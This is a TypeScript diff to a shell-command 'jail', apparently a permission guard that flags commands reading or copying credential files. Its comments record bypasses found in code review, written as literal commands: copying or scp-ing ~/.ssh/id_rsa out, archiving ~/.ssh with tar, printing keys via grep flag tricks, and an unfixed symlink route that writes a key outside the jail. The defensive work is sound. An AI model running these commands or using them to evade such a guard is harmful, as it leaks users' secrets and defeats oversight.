+      // `--file=KEY`, the short `-fKEY`, and a getopt ABBREVIATION of the long
+      // name (`--fil=KEY`, which argparse resolves and really uploads). The
+      // exact-name test missed the last of those, so the commit that generalised
+      // prefix resolution left the same misreading live one `=` away
+      // (/code-review final round).
+      const namesSource = (f: { long: string | null; letter: string | null }): boolean => {
+        const names = shape.sourceFlags ?? [];
+        if (f.long !== null)
+          return names.some(
+            (n) =>
+              n.startsWith('--') && (n === f.long || (f.long!.length >= 3 && n.startsWith(f.long!)))
+          );
+        return f.letter !== null && names.includes(f.letter);
+      };
       const inline = tail
-        .filter((w): w is string => w !== null && w.startsWith('--'))
+        .filter((w): w is string => w !== null && w.startsWith('-'))
         .map((w) => flagInfo(w))
-        .filter((f) => f.attached !== null && (shape.sourceFlags ?? []).includes(f.long ?? ''))
+        .filter((f) => f.attached !== null && namesSource(f))
         .map((f) => f.attached as string);
       return [
         ...args
-          .filter(
-            (a) =>
-              flagIs(a.afterFlag, shape.sourceFlags ?? []) &&
-              flagInfo(a.afterFlag as string).attached === null
-          )
+          .filter((a) => !copyPastOptions(a) && operandOf(a, shape.sourceFlags, shape.valueLetters))
           .map((a) => a.value),
         ...inline,
       ];
@@ -2305,7 +2939,41 @@ function copySourcePaths(words: (string | null)[]): string[] {
       src = targetDir || dynamicDest ? args : args.slice(0, -1);
       break;
   }
-  return src.filter((a) => !skipped(a) && !targetOperand(a)).map((a) => a.value);
+  const sources = src.filter((a) => !skipped(a) && !targetOperand(a)).map((a) => a.value);
+
+  // A literal destination INSIDE the jail is not a copy OUT of it:
+  // `cp /tmp/ci_key ~/.ssh/id_rsa` installs a key and `mv ~/.ssh/id_rsa
+  // ~/.ssh/id_rsa.bak` renames one. Only for the shapes whose destination IS the
+  // last operand -- for an archiver the last operand is an INPUT (`tar czf
+  // out.tgz ~/.ssh`) and with `-t DIR` the destination sits in the flag.
+  //
+  // ⚠️ This guard used to suppress on the DESTINATION alone, which /code-review
+  // round 5 turned into a bypass: `cp ~/.ssh/id_rsa /tmp/.ssh/k` and
+  // `scp ~/.ssh/id_rsa user@host:/tmp/.ssh/` produced no finding at all, because
+  // `/tmp/.ssh/` matches the same rule the real jail does and the matcher cannot
+  // tell one from the other. The source decides now:
+  //   no jailed source              -> an install, stay quiet (unchanged)
+  //   jailed source, SAME directory -> a rename inside the jail, stay quiet
+  //   jailed source, elsewhere      -> the credential is LEAVING: review
+  if (destIsLastOperand && typeof lastOperand === 'string' && matchSensitivePath(lastOperand)) {
+    const jailedSources = sources.filter((p) => matchSensitivePath(p));
+    // '' for a bare name, so `mv .env .env.local` compares equal instead of
+    // comparing `.env` with `.env.local` and prompting (/code-review round 6).
+    const dirOf = (p: string) => (/[\\/]/.test(p) ? p.replace(/[\\/][^\\/]*$/, '') : '');
+    if (jailedSources.length === 0) return [];
+    // ⚠️ KNOWN AND FILED, not closed here: `cp` FOLLOWS a symlink at the
+    // destination, so `ln -s /tmp/steal ~/.ssh/out` and then
+    // `cp ~/.ssh/id_rsa ~/.ssh/out` writes the key outside the jail with both
+    // paths looking in-jail (/code-review round 6, verified on a real
+    // filesystem). Restricting this exemption to `mv` -- which calls rename(2)
+    // and replaces the link instead of writing through it -- would close that
+    // path, and would also turn `cp ~/.ssh/config ~/.ssh/config.bak` into a
+    // prompt, a row stage 4 deliberately made quiet. Closing it properly needs
+    // symlink awareness, which this tier does not have and must not acquire by
+    // touching the filesystem. BUGS.md JAIL-13.
+    if (jailedSources.every((p) => dirOf(p) === dirOf(lastOperand))) return [];
+  }
+  return sources;
 }
 
 /**
@@ -2336,13 +3004,26 @@ function archiveInputs(
       /(^|\s)-[a-zA-Z]*[cruA]|--create|--append|--update|--concatenate/.test(flagsText);
     if (extracting && !writing) return [];
     void mode;
-    let i = 0;
-    if (bareKey) {
-      i = 1;
-      const next = args[1];
-      if (first.value.includes('f') && next && next.afterFlag === null) i = 2; // the archive
+    if (!bareKey) return args;
+    // Each VALUE letter in the bare key takes one following word, in key order:
+    // `tar cCf DIR ARCHIVE .` is `-C DIR -f ARCHIVE .`. Consuming exactly one word
+    // (for `f`) gave DIR to the archive slot and dropped it, so
+    // `tar cCf ~/.ssh out.tar .` archived the keys with no finding
+    // (/code-review round 9, confirmed with `tar tf`). `-C DIR` in a WRITING mode
+    // is the directory archived FROM, so it is a source like any other input.
+    let i = 1;
+    const fromDirs: PositionedArg[] = [];
+    for (const ch of first.value) {
+      if (!TAR_VALUE_LETTERS.includes(ch)) continue;
+      const operand = args[i];
+      // A flag between the key and this slot means the operand is NOT here:
+      // `tar cf - ~/.ssh` writes to stdout, so `-` is the archive and the jailed
+      // directory is an INPUT. That is why the slot must directly follow.
+      if (!operand || operand.afterFlag !== null) break;
+      i += 1;
+      if (ch === 'C') fromDirs.push(operand);
     }
-    return args.slice(i);
+    return [...fromDirs, ...args.slice(i)];
   }
   if (kind === 'zip') return first && first.afterFlag === '-' ? args : args.slice(1);
   if (kind === 'ar') return bareKey ? args.slice(2) : args.slice(1);
@@ -2422,6 +3103,291 @@ const positionalAfter = (words: (string | null)[], from: number, to = words.leng
   positionedArgs(words, from, to).map((a) => a.value);
 
 /**
+ * JAIL-10: the values of `=`-joined flag tokens whose flag opens a file for this
+ * verb (`grep --file=KEY` -> ['KEY']). Empty for a verb with no such flag.
+ *
+ * Only the `=` form: a separated operand (`grep --file KEY`) is already a
+ * positional word and is judged by the caller's own path list. `from` is the
+ * first word after the verb, so a wrapped read (`sudo grep --file=KEY`) is
+ * scanned from the unwrapped head and not from argv[0].
+ */
+/**
+ * Does `name` name one of `candidates`, the way getopt_long resolves it?
+ *
+ * getopt_long accepts any unambiguous PREFIX, so `--regex` IS `--regexp` and
+ * `--inc=` IS `--include=`. /code-review round 1 (2026-09-13) measured three
+ * BLOCK -> ALLOW regressions from exact-name matching alone: `grep --regex=foo
+ * KEY` excused the key, and GNU grep opened it.
+ *
+ * But getopt resolves an EXACT option name as itself and never as a prefix of a
+ * longer one, and dropping that rule invents false positives: `--exclude` is
+ * grep's own option, not an abbreviation of `--exclude-from`, so treating it as
+ * one blocked `grep --exclude=.env -r x .` -- a search that EXCLUDES the file and
+ * reads nothing (caught by this stage's own spec on the first attempt).
+ *
+ * So: an exact hit always counts; a name that is itself a KNOWN option of this
+ * verb counts only exactly; anything else may resolve by prefix. Prefix
+ * resolution is otherwise generous, because every use of this predicate errs
+ * toward MORE judging, and an ambiguous prefix makes the real command fail.
+ */
+function namesFlag(name: string, candidates: Set<string>, known?: Set<string>): boolean {
+  if (candidates.has(name)) return true;
+  if (!name.startsWith('--') || name.length < 3) return false;
+  if (known?.has(name)) return false;
+  for (const c of candidates) if (c.startsWith(name)) return true;
+  return false;
+}
+
+/** Every long option this verb is KNOWN to have, for the exact-wins rule above. */
+function knownLongFlags(verb: string): Set<string> {
+  const out = new Set<string>();
+  const shape = PATTERN_VERBS[verb];
+  if (shape) {
+    for (const set of [shape.takesValue, shape.noValue, shape.patternFlags, shape.noPatternFlags])
+      for (const f of set) if (f.startsWith('--')) out.add(f);
+  }
+  for (const f of FILE_OPERAND_FLAGS[verb] ?? []) if (f.startsWith('--')) out.add(f);
+  return out;
+}
+
+/**
+ * The flag NAMES a token carries: `--file=x` -> ['--file'], `-rnf` -> ['-r','-n','-f'].
+ *
+ * A short bundle stops at the FIRST argument-taking letter, because that letter
+ * swallows the rest of the token: `-tconfig` is `-t config`, not a bundle
+ * containing `-f`. Scanning every letter instead read the `f` in `config` as
+ * grep's pattern-FILE flag and blocked `rg -tconfig .env src/`, an ordinary typed
+ * search (/code-review round 3). `shape` is optional so the caller that has no
+ * verb shape still gets the whole-token split.
+ */
+function flagNamesOf(token: string, shape?: PatternShape): string[] {
+  if (token.startsWith('--')) {
+    const eq = token.indexOf('=');
+    return [eq > 0 ? token.slice(0, eq) : token];
+  }
+  const out: string[] = [];
+  for (const c of token.slice(1)) {
+    const name = `-${c}`;
+    out.push(name);
+    if (shape?.takesValue.has(name)) break;
+  }
+  return out;
+}
+
+/**
+ * What this flag token does to the word that FOLLOWS it, as three states.
+ *
+ * `'takes'` means the next word is this flag's value (and the flag name is
+ * returned, so a pattern flag's operand can be told apart). `'none'` means the
+ * next word is a free positional. `'unknown'` means we do not know, and the
+ * caller must then excuse nothing at all -- a false positive, never a bypass.
+ *
+ * A short bundle consumes the next word only when its argument-taking letter is
+ * LAST: an earlier one swallows the rest of the token instead, so `grep -en foo`
+ * reads `n` as -e's pattern and `foo` is a FILE. An `=` token carries its own
+ * value. Both spellings fail unsafely if handled naively, and both are pinned.
+ */
+type FlagEffect = { kind: 'takes'; flag: string } | { kind: 'none' } | { kind: 'unknown' };
+const NONE: FlagEffect = { kind: 'none' };
+const UNKNOWN: FlagEffect = { kind: 'unknown' };
+
+function flagEffect(token: string, shape: PatternShape, known: Set<string>): FlagEffect {
+  if (token === '--') return NONE;
+  // A lone `-` is not a flag at all. Every one of these tools takes it as the
+  // PATTERN (or as stdin), so the word after it is a FILE. Treating it as a
+  // no-value flag excused the credential: `grep - ~/.ssh/id_rsa` printed the key
+  // and read ALLOW (/code-review round 3). UNKNOWN is the honest answer, and it
+  // excuses nothing.
+  if (/^-+$/.test(token)) return UNKNOWN;
+  // `-NUM` is one token equal to `--context=NUM` and consumes nothing. Without
+  // this it read as UNKNOWN and `grep -5 .env notes.md` kept its false positive.
+  if (/^-\d+$/.test(token)) return NONE;
+  if (token.startsWith('--')) {
+    // An `=` token carries its own value, so it consumes no following word --
+    // true in getopt_long and in clap, for a recognised flag or not. Returning
+    // UNKNOWN here (round 3's first cut) bought nothing and hard-blocked
+    // `grep --group-separator=--- -A1 .env notes.md` (/code-review round 6). The
+    // VALUE is a separate question and flagOperandFiles judges it, including for
+    // an unrecognised flag: `grep --config=KEY` still blocks.
+    if (token.includes('=')) return NONE;
+    const takes = namesFlag(token, shape.takesValue, known);
+    const none = namesFlag(token, shape.noValue, known);
+    // An abbreviation that could be either is unknown, not a coin toss.
+    if (takes && none) return UNKNOWN;
+    if (takes) return { kind: 'takes', flag: token };
+    if (none) return NONE;
+    return UNKNOWN;
+  }
+  const letters = token.slice(1);
+  if (!letters) return NONE;
+  for (let i = 0; i < letters.length; i++) {
+    const name = `-${letters[i]}`;
+    if (shape.takesValue.has(name)) {
+      // Last letter: it takes the NEXT word. Otherwise it swallowed the rest of
+      // this token, so nothing follows it and the token consumes nothing.
+      return i === letters.length - 1 ? { kind: 'takes', flag: name } : NONE;
+    }
+    if (!shape.noValue.has(name)) return UNKNOWN;
+  }
+  return NONE;
+}
+
+/**
+ * Stage 5a: the words of a reader that the jail should judge -- every positional
+ * MINUS the one the verb's grammar names as the search pattern. A verb outside
+ * PATTERN_VERBS gets every positional, exactly as before this stage.
+ *
+ * Never excuses more than one word, and excuses by SLOT rather than by shape.
+ * When the pattern arrived from anywhere but a positional slot -- a flag operand,
+ * a bundle, an `=` token, a pattern FILE -- every positional is a file and
+ * nothing is excused except that flag's own operand. When a flag BEFORE the
+ * pattern is UNKNOWN to the table, slots cannot be counted past it and nothing is
+ * excused; a flag after the pattern is irrelevant and does not suppress it.
+ */
+function readTargets(
+  verb: string,
+  args: PositionedArg[],
+  flags: string[],
+  words: (string | null)[] = [],
+  from = 1
+): string[] {
+  const shape = PATTERN_VERBS[verb];
+  if (!shape) return args.map((a) => a.value);
+  const known = knownLongFlags(verb);
+  const names = flags.flatMap((f) => flagNamesOf(f, shape));
+  const patternElsewhere = names.some(
+    (n) => namesFlag(n, shape.patternFlags, known) || namesFlag(n, shape.noPatternFlags, known)
+  );
+  const excused = new Set<PositionedArg>();
+  // The operand of a value flag is that flag's argument, not a path the verb
+  // opens -- a count, an action, a label, an exclusion GLOB, or the pattern
+  // itself. So it is excused, EXCEPT for the flags whose operand IS a file the
+  // verb opens, which are exactly FILE_OPERAND_FLAGS (JAIL-10's table, derived
+  // here rather than restated). Without this, the headline false positive was
+  // fixed in only one of its two spellings: `grep --exclude=.env -r x .` ran
+  // while `grep --exclude .env -r x .` blocked (/code-review round 2).
+  const fileFlags = FILE_OPERAND_FLAGS[verb];
+  // Past `--` nothing is a flag, so no word there is a flag's operand. Round 5
+  // taught the pattern WALK that and left these loops behind: `grep -- -m KEY`
+  // excused the credential as `-m`'s operand while GNU grep opened and printed it
+  // (/code-review round 8).
+  const optionsEnd = words.findIndex((w, i) => i >= from && w === '--');
+  const pastOptions = (a: PositionedArg) => optionsEnd >= 0 && a.argv > optionsEnd;
+  for (const a of args) {
+    if (a.afterFlag === null || pastOptions(a)) continue;
+    const e = flagEffect(a.afterFlag, shape, known);
+    if (e.kind !== 'takes') continue;
+    if (fileFlags && namesFlag(e.flag, fileFlags, known)) continue; // a FILE: judge it
+    excused.add(a);
+  }
+  // A DYNAMIC word (`grep "$PAT" KEY`) occupies no slot, so without this the
+  // FILE became the first positional and was excused as the pattern -- measured
+  // ALLOW, block before this stage (/code-review round 3). The pattern may BE the
+  // dynamic word, so once one appears ahead of a candidate we cannot say which
+  // slot is the pattern, and we excuse nothing. A dynamic word AFTER the pattern
+  // (`grep .env "$FILE"`) is harmless and still excuses.
+  // Which ARGV position holds the search pattern, resolved the way the tool's own
+  // parser resolves it, left to right. One walk covers every case, and replacing
+  // two special-cased branches with it closed the bypass /code-review round 5
+  // found: the `--` branch excused the word after `--` unconditionally, so
+  // `grep TODO -- ~/.ssh/id_rsa` -- pattern already given, `--` then naming a
+  // FILE -- excused the credential and printed the key.
+  //
+  //   a dynamic word   the pattern may BE it: unknowable, excuse nothing
+  //   `--`             options end, so the NEXT word is the pattern whatever it
+  //                    looks like (and may be dash-looking, hence absent from args)
+  //   a value flag     its operand follows: skip both
+  //   a no-value flag  keep looking
+  //   an UNKNOWN flag  we cannot count slots past it: excuse nothing
+  //   anything else    this is the pattern
+  const patternArgv = ((): number => {
+    for (let i = from; i < words.length; i++) {
+      const w = words[i];
+      if (w === null) return -1;
+      if (w === '--') return i + 1;
+      // `-` and `--` are handled above; every other dash word is a flag.
+      if (w.startsWith('-')) {
+        const e = flagEffect(w, shape, known);
+        if (e.kind === 'takes') i += 1;
+        else if (e.kind === 'unknown') return -1;
+        continue;
+      }
+      return i;
+    }
+    return -1;
+  })();
+  if (!patternElsewhere && patternArgv >= 0) {
+    const a = args.find((x) => x.argv === patternArgv);
+    if (a) excused.add(a);
+  }
+  return args.filter((a) => !excused.has(a)).map((a) => a.value);
+}
+
+function flagOperandFiles(verb: string, words: (string | null)[], from: number): string[] {
+  const flags = FILE_OPERAND_FLAGS[verb];
+  if (!flags) return [];
+  const known = knownLongFlags(verb);
+  const out: string[] = [];
+  for (let i = from; i < words.length; i++) {
+    const w = words[i];
+    if (w === null || !w.startsWith('-') || w === '--') continue;
+    if (w.startsWith('--')) {
+      // `--file=KEY`, and its getopt_long abbreviations (`--fil=KEY`).
+      const eq = w.indexOf('=');
+      if (eq <= 0) continue;
+      const name = w.slice(0, eq);
+      const value = w.slice(eq + 1);
+      if (!value) continue;
+      if (namesFlag(name, flags, known)) {
+        out.push(value);
+        continue;
+      }
+      // An UNKNOWN `=` flag on a verb whose option table we actually have: judge
+      // the value. `grep --config=KEY` opens the key on ugrep and echoes its
+      // first line back in an error (/code-review round 3), and the same shape
+      // hides `--include-from=` and `--ignore-files=`, which have no separated
+      // spelling to fall back on. Scoped to PATTERN_VERBS on purpose: for a verb
+      // with no table everything is unknown, and judging there would block
+      // `sort --output=KEY`, a WRITE and the legitimate CI key-install case.
+      const shape = PATTERN_VERBS[verb];
+      if (!shape) continue;
+      const recognised =
+        namesFlag(name, shape.takesValue, known) ||
+        namesFlag(name, shape.noValue, known) ||
+        namesFlag(name, shape.patternFlags, known) ||
+        namesFlag(name, shape.noPatternFlags, known);
+      if (!recognised) out.push(value);
+      continue;
+    }
+    // ATTACHED short operand: `grep -fKEY`, `grep -nfKEY`, `sed -fKEY`. The
+    // third spelling of one read, and the one the first cut of JAIL-10 missed
+    // while claiming only `=` needed this table (/code-review round 1, measured
+    // under strace: `grep -fKEY` opens KEY). The first argument-taking letter
+    // swallows the REST of the token, so only that letter's operand counts.
+    // The FIRST argument-taking letter swallows the rest of the token, so only
+    // that letter's operand counts. Scanning for a file-operand letter anywhere
+    // instead found the `f` inside `-e'config/.env'` and judged the regex as a
+    // path (/code-review round 2). `argTaking` is the union, so a non-file flag
+    // still stops the scan rather than being skipped over.
+    const shape = PATTERN_VERBS[verb];
+    const letters = w.slice(1);
+    for (let j = 0; j < letters.length; j++) {
+      const name = `-${letters[j]}`;
+      const isFileFlag = flags.has(name);
+      const argTaking =
+        isFileFlag ||
+        (shape?.takesValue.has(name) ?? false) ||
+        (READER_VALUE_LETTERS[verb] ?? []).includes(letters[j]);
+      if (!argTaking) continue;
+      const attached = letters.slice(j + 1);
+      if (isFileFlag && attached) out.push(attached);
+      break;
+    }
+  }
+  return out;
+}
+
+/**
  * Non-flag literal words after the reader when the reader is reached through
  * a wrapper, a runner, `chroot`, or find's -exec action. Null when this
  * CallExpr is not a wrapped read.
@@ -2445,7 +3411,14 @@ function wrappedReadPaths(words: (string | null)[], name: string): string[] | nu
   }
   if (!COMMAND_WRAPPERS.has(name) && !RUNNER_WRAPPERS.has(name)) return null;
   const h = unwrapCommandHead(words);
-  return h > 0 && isReaderWord(words[h] ?? null) ? positionalAfter(words, h + 1) : null;
+  if (h <= 0 || !isReaderWord(words[h] ?? null)) return null;
+  const head = baseWord(words[h]);
+  const rest = words.slice(h + 1);
+  const restFlags = rest.filter((w): w is string => w !== null && w.startsWith('-'));
+  return [
+    ...readTargets(head, positionedArgs(words, h + 1), restFlags, words, h + 1),
+    ...flagOperandFiles(head, words, h + 1),
+  ];
 }
 
 /**
